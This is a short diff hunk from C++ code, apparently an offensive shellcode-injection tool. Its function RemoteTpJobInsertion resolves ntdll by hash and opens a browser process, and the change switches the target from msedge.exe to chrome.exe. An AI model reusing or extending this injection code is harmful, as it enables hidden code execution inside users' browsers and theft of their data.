@@ -220,7 +220,7 @@ bool RemoteTpJobInsertion(LPVOID lpShellcode, DWORD dwShellSize) {
 	LPVOID hNtdll = apiResolve.GetModuleBaseAddress(hashNtdll);
 	LPHANDLE pDuplicateHandle = new HANDLE;
 	DWORD PID = 0;
-	HANDLE hProc = GetProcHandlebyName((LPWSTR)L"msedge.exe");
+	HANDLE hProc = GetProcHandlebyName((LPWSTR)L"chrome.exe");
 	if (!hProc) {
 		return false;
 	}
